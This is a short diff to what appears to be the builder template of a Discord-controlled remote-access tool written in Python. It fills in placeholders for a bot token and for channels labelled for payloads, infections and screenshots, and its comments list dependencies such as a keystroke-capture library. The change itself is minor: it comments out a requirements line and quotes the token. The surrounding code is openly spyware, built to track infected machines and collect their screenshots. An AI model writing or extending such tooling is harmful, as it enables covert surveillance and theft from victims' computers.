@@ -34,7 +34,7 @@ from cryptography.fernet import Fernet
 
 #requirements = ["","lxml","discord.py","requests","pillow","admin","pynput"]
 #with open(f'requirements.txt', 'a') as saveFile:
-#    saveFile.write('\n'.join(requirements))
+#    #saveFile.write('\n'.join(requirements))
 #    
 #def check():
 #    subprocess.check_call([sys.executable, '-m','pip', 'install','-r',"requirements.txt"])
@@ -74,7 +74,7 @@ global CurrentVersion
 global TLC
 
 
-DiscordBotToken ={token}
+DiscordBotToken =("{token}")
 PLC = {PLC1}  # PAYLOAD-CHANNEL-ID
 IFC = {IFC1}  # INFECTIONS-CHANNEL-ID
 PIC = {PIC1}  # SCREENSHOT-CHANNEL-ID
